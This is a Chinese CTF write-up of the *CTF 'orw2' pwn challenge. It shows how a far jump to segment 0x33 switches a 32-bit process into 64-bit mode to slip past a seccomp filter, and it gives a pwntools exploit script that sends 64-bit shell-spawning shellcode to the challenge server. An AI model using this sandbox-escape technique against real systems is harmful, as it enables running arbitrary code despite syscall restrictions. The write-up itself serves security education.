---
title: writeup.starctf.pwn.orw2
date: 2019-08-26 15:15:00
categories: writeup
tags: [writeup,pwn]

---

## 前言

做orw的时候很轻松，做orw2，找不到任何资料，耐心问了师傅知道 `jmp` 指令（特指远跳转）还可以通过修改 CS 寄存器来切换 `Segment Descriptor`，使 32 位进程可以切换CPU至 64 位处理 64 位的指令集，orw2一开始通过 `seccomp` 限制了一票 `syscall`，但是不限制 64 位架构，因此这题需要切换至 64 位 `arch`，然后再 `syscall`。

一个关于GDT的参考文章：[传送门](https://www.malwaretech.com/2014/02/the-0x33-segment-selector-heavens-gate.html)

## 分析
1.checksec
![](https://i.loli.net/2019/08/26/XBFTzPI3WL5itDr.png)
2.seccomp
![](https://i.loli.net/2019/08/26/APJFj4cM3vZ7hrn.png)
把规则表拿出来

![](https://i.loli.net/2019/08/26/XvGmN8cFZ9d6gBf.png)
可以看到使用 64 位模式即可跳过检查

## 方法
![](https://i.loli.net/2019/08/26/fqzeANKG5Wd1tSU.png)
很简单，这buffer是在bss段，还没开PIE。首先切换指令模式
```python
from pwn import *    
import struct

context.clear(arch='i386', os='linux')  
code32 = "jmp 0x33:0x804a068\n"
shell32 = asm(code32)
```
然后是 64 位的shellcode
```python
context.clear(arch='amd64', os='linux')  
code64 = pwnlib.shellcraft.amd64.linux.sh()
shell64 = asm(code64)

print "length 32: %x" % (len(shell32))
print "length 64: %x" % (len(shell64))
```
稍微安排一下，第一级编译出来长度为7，加一个nop，所以跳转到 `0x804a068`

## 结果
```python
shell = shell32 + 'X' + shell64 

conn = remote("pwn.sixstars.team", 22019) 
conn.sendline(shell)    
ret = conn.recvrepeat(0.1)
print ret 
conn.interactive()
```
执行
![](https://i.loli.net/2019/08/26/4pi8DHYQPherMAK.png)
## 参考资料
https://www.hardwaresecrets.com/amd-64-bit-architecture-x86-64/2/
https://stackoverflow.com/questions/24113729/switch-from-32bit-mode-to-64-bit-long-mode-on-64bit-linux
https://www.cnblogs.com/lanrenxinxin/p/4821152.html
https://www.cnblogs.com/HsinTsao/p/7270732.html
